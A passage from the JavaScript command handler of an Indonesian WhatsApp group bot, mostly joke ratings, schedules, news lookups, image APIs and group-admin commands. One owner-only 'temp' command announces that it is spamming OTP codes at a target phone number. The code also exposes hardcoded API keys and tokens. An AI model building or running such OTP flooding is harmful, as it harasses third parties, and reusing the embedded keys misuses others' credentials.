            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            sky.sendTextWithMentions(m.chat, jawab, m)
            }
            break
            case 'jadian': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            sky.sendTextWithMentions(m.chat, jawab, m)
            }
            break
            case 'react': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!isCreator) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                sky.sendMessage(m.chat, reactionMessage)
            }
            break  
            // Ephoto1
case 'aidalle': {
  if (!isPrem) return replyprem(mess.premium)
if (args1.length == 0) return m.reply(`Example: ${prefix + command} apa aja yang ada di otak lu`)
		      m.reply(mess.wait)
 sky.sendMessage(m.chat, { image: { url: `https://widipe.com/dalle?text=${text}` }, caption: `Created By Avosky-MD\n\n Type: ${command}\n\nText: ${text}`})
 }
			break
    //MENF
			case 'halo': {
 const moment = require('moment-timezone');
 const hour = moment.tz('Asia/Jakarta').hour();
 let greeting;

 if (hour >= 0 && hour < 12) {
 greeting = 'Selamat pagi';
 } else if (hour >= 12 && hour < 15) {
 greeting = 'Selamat siang'; 
 } else if (hour >= 15 && hour < 18) {
 greeting = 'Selamat sore';
 } else {
 greeting = 'Selamat malam';
 }

 await m.reply(`${greeting}! Semoga harimu menyenangkan ya.`);
}
break

			
case 'rate1': {
  if (!m.quoted && !text) throw `Kirim/reply gambar dengan caption ${prefix + command}`;
  let target = m.quoted ? m.quoted.sender : m.sender;
  let rate = Math.floor(Math.random() * 11); // Generate random rating from 0 to 10
  let message = `Menurutku, @${target.split('@')[0]} memiliki tingkat kegantengan/kecantikan sebesar ${rate}/10!`;
  m.reply(message)
  }
  break;
			
						            case 'quotesrandom': {
                let d = await fetchJson(`https://api.quotable.io/random`)
              await sky.sendMessage(from, { text: d.content }, { quoted: m})
            }
            break		
																											
case 'aiscene': {                 
                   m.reply(mess.wait)
                    const media = await sky.downloadAndSaveMediaMessage(quoted)
                    const { TelegraPh } = require('./lib/uploader')
                    const anu = await TelegraPh(media)
                    await 
                    sky.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/aiscene?url=${anu}&apikey=skuy33` }, caption: mess.done }, { quoted: m})
                    }
                    break

case 'stablediff': {
if (!isPrem) return replyprem(mess.premium)
if (args1.length == 0) return m.reply(`Example: ${prefix + command} highly20detailed,20intricate,204k,208k,%20sharp20focus,20detailed20hair,20detailed`)
		      m.reply(mess.wait)
 sky.sendMessage(m.chat, { image: { url: `https://widipe.com/stablediffusion?text=${text}` }, caption: `Created By Avosky-MD\n\n Type: ${command}\n\nText: ${text}`})
 }
			break
			case 'aibing': {
		      m.reply(mess.wait)
 sky.sendMessage(m.chat, { image: { url: `https://widipe.com/download/bing` }, caption: `Here You Go ${pushname}`})
 }
			break
case 'cekmember': {
  if (!m.isGroup) throw mess.group;
  if (args1.length == 0) return m.reply(`Gunakan perintah ini dengan contoh: *cekmember 62* untuk mencari anggota dengan awalan nomor tertentu.`)
  const participants = await sky.groupMetadata(m.chat).then(metadata => metadata.participants);
  
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith(`${q}`)) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  
const replyMessage = `Jumlah Anggota Grup Berdasarkan Awalan +${q} Sebanyak \n️${countIndonesia} Member`;
  m.reply(replyMessage);
  }
  break
case 'rem': case 'kaneki': {
  if (!isPrem) return replyprem(mess.premium)
if (args1.length == 0) return m.reply(`Example: ${prefix + command} Avosky-MD`)
		      m.reply(mess.wait)
 sky.sendMessage(m.chat, { image: { url: `https://api.caliph.biz.id/api/${command}?nama=${text}&apikey=SxuR9VBB` }, caption: `Created By Avosky-MD\n\n Type: ${command}\n\nText: ${text}`})
 }
			break
			case 'ratu': {
  if (!isPrem) return replyprem(mess.premium)
if (args1.length == 0) return m.reply(`Example: ${prefix + command} Avosky-MD`)
		      m.reply(mess.wait)
 sky.sendMessage(m.chat, { image: { url: `https://api.lenttobs.xyz/logo/ratu1?text=${q}` }, caption: `Created By Avosky-MD\n\n Type: ${command}\n\nText: ${text}`})
 }
			break			
case 'lovemsg': {
  if (!isPrem) return replyprem(mess.premium)
if (args1.length == 0) return m.reply(`Example: ${prefix + command} Avosky-MD`)
		      m.reply(mess.wait)
 sky.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/lovemessage?apikey=Gata_Dios&text=${text}` }, caption: `Created By Avosky-MD\n\n Type: ${command}\n\nText: ${text}`})
 }
			break

case 'meme1': {
  if (!isPrem) return replyprem(mess.premium)
if (args1.length == 0) return m.reply(`Example: ${prefix + command} Avosky-MD`)
		      m.reply(mess.wait)
 sky.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme1?apikey=Gata_Dios&text=${text}` }, caption: `Created By Avosky-MD\n\n Type: ${command}\n\nText: ${text}`})
 }
			break
           case 'listonline':
            case 'liston': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!m.isGroup) m.reply(mess.group)
                let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                let online = [...Object.keys(store.presences[id]), botNumber]
                sky.sendText(m.chat, '⏰ List Online:\n\n' + online.map(v => '🌱 @' + v.replace(/@.+/, '')).join`\n`, m, {
                    mentions: online
                })
            }
            break

case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
sky.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
sky.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break	        
case 'jadwalbola': {
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwalbola?apikey=Gata_Dios`)	
			var titttttttttttt = 'Jadwal Bola :\n'
			for (var x of data.result) {
				titttttttttttt += `Pada : ${x.time}\n`
				titttttttttttt += `Event : ${x.event}\n`
				titttttttttttt += `Match : ${x.match}\n`
				titttttttttttt += `TV : ${x.tv}\n\n`
			}
			m.reply(titttttttttttt)
			}
			break
case 'jadwalsolat': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!text) return m.reply('Mana Kotanya?')
            m.reply(mess.wait)
            let anu = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${text}?apikey=Gata_Dios`)
            m.reply(`Wilayah: ${anu.result.wilayah}\n\nTanggal: ${anu.result.tanggal}\nSahur: ${anu.result.sahur}\nImsak: ${anu.result.imsak}\nTerbit: ${anu.result.terbit}\nDhuha: ${anu.result.dhuha}\nDzuhur: ${anu.result.dzuhur}\nAshar: ${anu.result.ashar}\nMagrib: ${anu.result.maghrib}\nIsya: ${anu.result.isya}`)
            }
            break
 //TES
// ===================================== //
		    case 'jadwaltvnow': {
 const avs = () => {
 return new Promise(async (resolve, reject) => {
 try {
 const { data } = await axios.get('https://www.jadwaltv.net/channel/acara-tv-nasional-saat-ini');
 const $ = cheerio.load(data);
 let tv = [];
 $('table.table.table-bordered > tbody > tr').each((u, i) => {
 let an = $(i).text().split('WIB');
 if (an[0].trim() === 'JamAcara') return; // Mengabaikan header
 if (typeof an[1] === 'undefined') return tv.push('\n' + '*' + an[0].trim() + '*');
 tv.push(`${an[0].trim()} - ${an[1].trim()}`);
 });
 if (tv.length === 0) return resolve({ developer: '@avosky', mess: 'No result found' });
 resolve(tv);
 } catch (err) {
 console.error(err);
 reject('Terjadi kesalahan saat mengambil data jadwal TV.');
 }
 });
 };

 try {
 const tvSchedule = await avs();
 if (Array.isArray(tvSchedule)) {
 let message = 'Jadwal TV Saat Ini:\n';
 tvSchedule.forEach(item => {
 message += `${item}\n`;
 });
 m.reply(message);
 } else {
 m.reply(tvSchedule.mess);
 }
 } catch (error) {
 m.reply(error);
 }
}
break
			 case 'temp': {
if (!isCreator) return m.reply("ngapain?") 
  if (!q.includes('|')) return m.reply(`Use: .temp <kode negara>|<nomor kartu>\nExaple: .${command} +62|83754338986`)
    const kodenegara = q.substring(0, q.indexOf('|') - 0)
    const nomortarget = q.substring(q.lastIndexOf('|') + 1) 
m.reply(`*Temporary Success*\nBot is Spamming Otp Please Check Target Number\nType ${prefix}stoptempor to Stop Temporary*`);
await temporary(sky, m, kodenegara, nomortarget, from)
}
break
case 'cnnindonesia':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia?apikey=Gata_Dios`)
			m.reply(mess.wait)
			var tittttttt = 'Result :\n'
			for (var x of data.result) {
				tittttttt += `Judul : ${x.judul}\n`
				tittttttt += `Link : ${x.link}\n`
				tittttttt += `Tipe : ${x.tipe}\n`
				tittttttt += `Published : ${x.waktu}\n\n`
			}
			m.reply(tittttttt)
			}
			break
			
		    case 'cnnnasional':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=Gata_Dios`)
			m.reply(mess.wait)
			var titttttttt = 'Result :\n'
			for (var x of data.result) {
				titttttttt += `Judul : ${x.judul}\n`
				titttttttt += `Link : ${x.link}\n`
				titttttttt += `Tipe : ${x.tipe}\n`
				titttttttt += `Published : ${x.waktu}\n\n`
			}
			m.reply(titttttttt)
			}
			break
			
		    case 'cnninternasional':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=Gata_Dios`)
			m.reply(mess.wait)
			var tittttttttt = 'Result :\n'
			for (var x of data.result) {
				tittttttttt += `Judul : ${x.judul}\n`
				tittttttttt += `Link : ${x.link}\n`
				tittttttttt += `Tipe : ${x.tipe}\n`
				tittttttttt += `Published : ${x.waktu}\n\n`
			}
			m.reply(tittttttttt)
			}
			break
			
		    			
		    			case 'keywords': {
    if (!text) {
        return m.reply(`Berikan keyword atau URL situs web untuk mendapatkan daftar kata kunci yang sering dicari.\n\nContoh: ${prefix + command} url`);
    }

    axios.get(`https://api.serpstat.com/v3/keywords_data?query=${encodeURIComponent(text)}&token=e0724f58e05184b71d71f345d6ef824e`)
        .then(response => {
            const keywords = response.data.keywords_data.keywords;

            if (keywords.length > 0) {
                const topKeywords = keywords.slice(0, 5).map(keyword => keyword.keyword).join(', ');
                m.reply(`Beberapa kata kunci yang sering dicari pada ${text}: ${topKeywords}`);
            } else {
                m.reply(`Tidak ada data kata kunci yang tersedia.`);
            }
        })
        .catch(error => {
            m.reply('Terjadi kesalahan saat mengambil data kata kunci. Silakan coba lagi nanti.');
        });
}
break;
		                case 'rst': {
await sky.sendMessage(from, {text: `_Restarting`})
await sky.sendMessage(from, {text: "_Succes_"})
await sleep(1000)
process.send('reset') 
}
break
			case 'kodepos': {
if (!q) return m.reply(`kotanya??`)
 m.reply(mess.wait);

 try {
 // Mengambil argumen pencarian
 const query = encodeURIComponent(args.join(' ')); // Menggabungkan semua argumen menjadi satu string dan encode

 // Membuat URL untuk pencarian kode pos berdasarkan kota
 const url = `https://kodepos99.com/pencarian?q=${query}`;

 // Melakukan request ke situs web kodepos99.com
 const { data } = await axios.get(url);
 const $ = cheerio.load(data);

 // Menyusun hasil pencarian
 const result = [];
 $('table.table tbody tr').each((index, element) => {
 const kodepos = $(element).find('td:nth-child(2)').text().trim();
 const kecamatan = $(element).find('td:nth-child(3)').text().trim();
 const kabupatenKota = $(element).find('td:nth-child(4)').text().trim();
 const provinsi = $(element).find('td:nth-child(5)').text().trim();

 result.push({
 kodepos,
 kecamatan,
 kabupatenKota,
 provinsi
 });
 });

 // Memeriksa apakah data hasil pencarian ada
 if (result.length === 0) {
 m.reply('Tidak ditemukan data untuk kode pos yang dimaksud.');
 return;
 }

 // Menyusun pesan hasil pencarian
 let resultText = `> ${text}\n\n`;
 result.forEach((item, index) => {
 resultText += `*${index + 1}.*\n`;
 resultText += `Kode Pos : ${item.kodepos}\n`;
 resultText += `Kecamatan : ${item.kecamatan}\n`;
 resultText += `Kabupaten/Kota : ${item.kabupatenKota}\n`;
 resultText += `Provinsi : ${item.provinsi}\n\n`;
 });

 // Mengirimkan pesan hasil pencarian
 m.reply(resultText);
 } catch (error) {
 // Menangani kesalahan API atau jaringan
 m.reply('Terjadi kesalahan saat mengambil data kode pos.');
 console.error(error);
 }
}
break;


			
		    case 'jadwalbola': {
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwalbola?apikey=Gata_Dios`)
			m.reply(mess.wait)
			var titttttttttttt = 'Jadwal Bola :\n'
			for (var x of data.result) {
				titttttttttttt += `Pada : ${x.time}\n`
				titttttttttttt += `Event : ${x.event}\n`
				titttttttttttt += `Match : ${x.match}\n`
				titttttttttttt += `TV : ${x.tv}\n\n`
			}
			m.reply(titttttttttttt)
			}
			break
        // Fun Fitur 
        
            case 'apakah': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
                const kah = apa[Math.floor(Math.random() * apa.length)]
                m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
                }
                break
            case 'bisakah': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
                const ga = bisa[Math.floor(Math.random() * bisa.length)]
                m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
                }
                break
            case 'bagaimanakah': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Gimana yeee']
                const ya = gimana[Math.floor(Math.random() * gimana.length)]
                m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
                }
            break
            case 'rate': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
                const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const te = ra[Math.floor(Math.random() * ra.length)]
                m.reply(`Rate : ${q}\nJawaban : *${te}%*`)
                }
            break           
            case 'gantengcek':
            case 'cekganteng': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
                const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const teng = gan[Math.floor(Math.random() * gan.length)]
                m.reply(`Nama : ${q}\nJawaban : *${teng}%`)
                }
            break
                
            case 'cantikcek':
            case 'cekcantik': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Akame`)
                const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const tik = can[Math.floor(Math.random() * can.length)]
                m.reply(`Nama : ${q}\nJawaban : *${tik}%`)
                }
            break
            
            case 'sangecek':
            case 'ceksange':
            case 'gaycek':
            case 'cekgay':
            case 'lesbicek':
            case 'ceklesbi': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
                const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
                m.reply(`Nama : ${q}\nJawaban : *${sange}%*`)
                }
            break
               
            case 'kapankah': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!q) return m.reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
                const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
                const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
                m.reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
                }
            break
            
            case 'wangy': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!q) return m.reply(`Contoh : .wangy Riy`)
                qq = q.toUpperCase()
                awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
                m.reply(awikwok)
                }
            break                      
case 'cekmati': {
  const nama = m.body.split(' ')[1]; // Mengambil nama dari pesan
  if (!nama) {
    m.reply('Silakan masukkan nama seseorang untuk memulai permainan.');
    return;
  }
  // Menghasilkan umur secara acak antara 1 hingga 100 tahun
  const umur = Math.floor(Math.random() * 100) + 1;
  m.reply(`Hasil cek mati untuk ${nama} \n\nNama: ${nama}\nMati Pada Umur : ${umur} tahun`);
  break;
}
 	             
            case 'joins': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await sky.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
            }
            break
case 'berkelahi':
  if (!users[m.sender]) {
    users[m.sender] = {
      nama: m.sender,
      skor: 0,
    };
  }

  // Generate skor acak antara 1 hingga 10
  const skorPengguna = Math.floor(Math.random() * 10) + 1;
  const skorBot = Math.floor(Math.random() * 10) + 1;

  const skorSebelumnya = users[m.sender].skor; // Simpan skor sebelumnya
  users[m.sender].skor += skorPengguna; // Tambahkan skor baru

  if (skorPengguna > skorBot) {
    m.reply(`Anda menang! Skor Anda bertambah: ${skorPengguna}. Skor total Anda: ${users[m.sender].skor}`);
  } else if (skorBot > skorPengguna) {
    m.reply(`Anda kalah! Skor Anda berkurang: ${skorSebelumnya - users[m.sender].skor}. Skor total Anda: ${users[m.sender].skor}`);
  } else {
    m.reply(`Seri! Skor Anda tidak berubah. Skor total Anda: ${users[m.sender].skor}`);
  }

  break;
// Case untuk melihat skor pengguna
case 'skor':
  if (users[m.sender]) {
    m.reply(`${users[m.sender].nama}, skor Anda saat ini: ${users[m.sender].skor}`);
  } else {
    m.reply(`Anda belum bermain. Ketik *berkelahi* untuk bermain.`);
  }
  break;

	case 'kick': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await sky.groupParticipantsUpdate(m.chat, users, 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
case 'add': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sky.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'closetime': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
if (!m.isGroup) throw mess.group
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isBotAdmins) return XeonStickBotAdmin()
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return m.reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
m.reply(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
sky.groupSettingUpdate(from, 'announcement')
m.reply(close)
}, timer)
}
break
case 'opentime': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
if (!m.isGroup) throw mess.group
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isBotAdmins) return XeonStickBotAdmin()
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return m.reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
m.reply(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
sky.groupSettingUpdate(from, 'not_announcement')
m.reply(open)
}, timer)
}
break
	case 'promote': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await sky.groupParticipantsUpdate(m.chat, users, 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
case 'randompromote': {
  if (!isAdmins) throw mess.admin;
  if (!isGroup) throw mess.onlygroup;
  if (!args[0]) throw `Gunakan: *${prefix}randompromote [jumlah anggota yang ingin dipromosikan]*`;

  const jumlahPromote = parseInt(args[0]);
  if (isNaN(jumlahPromote) || jumlahPromote <= 0) throw 'Jumlah anggota yang ingin dipromosikan harus berupa angka positif.';

  const participants = await sky.groupMetadata(from);
  const participantList = participants.participants;

  for (let i = 0; i < Math.min(jumlahPromote, participantList.length); i++) {
    const randomIndex = Math.floor(Math.random() * participantList.length);
    const participant = participantList[randomIndex];

    if (!participant.isAdmin) {
      const users = [participant.id];
      const result = await sky.groupParticipantsUpdate(m.chat, users, 'promote');
      
      await new Promise(resolve => setTimeout(resolve, 1000)); // Jeda sebelum mempromosikan anggota berikutnya
    }
  }

  m.reply(`Berhasil mempromosikan ${Math.min(jumlahPromote, participantList.length)} anggota secara random menjadi admin grup.`);
  break;
}
	case 'demote': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await sky.groupParticipantsUpdate(m.chat, users, 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await sky.updateBlockStatus(users, 'block')
		await m.reply(`Done`)
	}
	break
        case 'unblock': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await sky.updateBlockStatus(users, 'unblock')
		await m.reply(`Done`)
	}
	break
	    case 'setname': case 'setsubject': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await sky.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await sky.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
                     case 'berburu': {
    if (m.mentionedJid.length !== 3) {
        return await m.reply('Tag 3 pengguna untuk memulai permainan berburu bersama.');
    }

    const players = m.mentionedJid;
    const maxRounds = 3;
    const playerScores = {};

    players.forEach(player => {
        playerScores[player] = 0;
    });

